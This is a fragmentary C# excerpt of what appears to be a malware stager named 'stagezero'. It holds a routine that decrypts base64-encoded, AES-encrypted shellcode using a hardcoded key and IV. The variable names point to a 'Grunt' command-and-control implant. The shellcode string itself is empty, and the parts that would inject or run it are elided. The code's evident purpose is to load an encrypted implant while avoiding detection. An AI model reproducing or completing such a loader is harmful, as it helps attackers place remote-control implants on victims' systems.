...
namespace stagezero
{
    class Program
    {
        static byte[] DecryptShellcode(string encB64, string keyB64, string ivB64)
        {
        ...
        static void Main(string[] args)
        {
            ...
            string gruntx64 = "";
            string gruntKey = "tHJ3IMm9OR/dlguysRgUqgiNFv98AAF5ZZZnyWPaDVM=";
            string gruntIV = "YDbQg20N/8lIzoALVGBg9A==";

            byte[] sc = DecryptShellcode(gruntx64, gruntKey, gruntIV);
